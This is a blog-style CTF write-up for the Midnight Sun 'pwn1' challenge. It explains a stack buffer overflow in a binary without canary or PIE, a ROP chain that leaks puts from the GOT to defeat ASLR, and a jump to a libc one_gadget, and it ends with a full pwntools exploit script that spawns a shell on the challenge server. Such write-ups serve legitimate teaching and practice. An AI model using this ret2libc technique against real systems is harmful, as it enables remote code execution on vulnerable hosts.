---
layout: post
title:  "Midnightsun ctf writeup pwn 1"
categories: [ctf]
tags: [ctf]
---
This is the writeup of one of the challenge of the midnightsun ctf.
In this challenge were given a binary and a libc. Once i had executed the binary on the video appeared the written "buffer: ".
![My helpful screenshot](/assets/start.png)
And after that i could insert my buffer and try to exploit the program.
So the first thing that i did was control what kind of security measures the binary had using the utilities *rabin2* (to use this you had to install radare2) and with *checksec*.
And so with *checksec pwn1*:
![My helpful screenshot](/assets/checksec.png)


And with *rabin2 -I pwn1*:


![My helpful screenshot](/assets/rabin2.png)


It was easy to see that there were no canaries, so if i put in input in this program to much character i would overwritten the return address of the current function. The other thing that i noticed from the images below is that the binary was not PIE position indipendent executable (or pic position indipendent code) this means that the binary was always loaded in memory at a specific address. 
To sum up all of this, the vulnerability was a buffer overflow that was easy to exploit since the binary was not PIE and of course there was no canary.


To exploit the program i first leaked the value of a libc function in memory in order to find the base address of libc. So i had to overwrite the return address of the function with the correct values in order to obtain what i needed.
 To do this i searched in the binary where was the GOT in memory (in particular the address of the function *puts* but could be also another function), after that i searched the gadget *pop rdi* in order to put in *rdi* register the value of the GOT. In details i first overwritten the return address with the *pop rdi* gadget, and subsequently with the got address. To display on video i searched in the binary the address of *puts* in plt and i put this address after the GOT address, in this way i was able to write on video the leak that i needed. And with this leak i was able to calculate the address of the one gadget to get a shell. To do this i used the one_gadget utility to find in the libc where is the call to */bin/sh* than i calculated the libc base address in memory subtracting at the leak the offset of puts from the libc that was given. And in the end i summed to this base address the offset of */bin/sh* and i found the address to jump to get a shell. But before do this i had to add also the address of main in the input buffer to "restart" the program after the address of function *puts* because if had not do this the program would showed me the leak and would be crashed. So only just when the program reasked the buffer in input i could overwrite the return address with the one_gadget address.
Here's my final exploit:
{% highlight python %}
from pwn import *

#pwn1-01.play.midnightsunctf.se 10001
#pay attention to use in local you had to put your libc and your one_gadget offset
#conn = process("./pwn1") 

conn = remote("pwn1-01.play.midnightsunctf.se", 10001)

BUF = "A" * 0x40
ebp = "B" * 0x8
offset_one_gadget = 0x4f2c5
elf = ELF("./pwn1")

libc = ELF('libc.so')

puts_got = 0x00602018  
puts_plt = 0x00400550 
main = 0x00400698

pop_rdi = 0x00400783
OFFSET = "A" * 72


conn.recvuntil(": ")

conn.send(OFFSET)
conn.send(p64(pop_rdi))
conn.send(p64(puts_got))
conn.send(p64(puts_plt))
conn.sendline(p64(main))

var = conn.recvline()


leak = int(var[0:6][::-1].hex(), 16)
log.info("puts leak: "+hex(leak))

one_gadget = leak - libc.symbols['puts'] + offset_one_gadget

conn.recvuntil(": ")
log.info("one gadget a: "+ hex(one_gadget))

conn.send(OFFSET)
conn.sendline(p64(one_gadget))

conn.interactive()

{% endhighlight %}








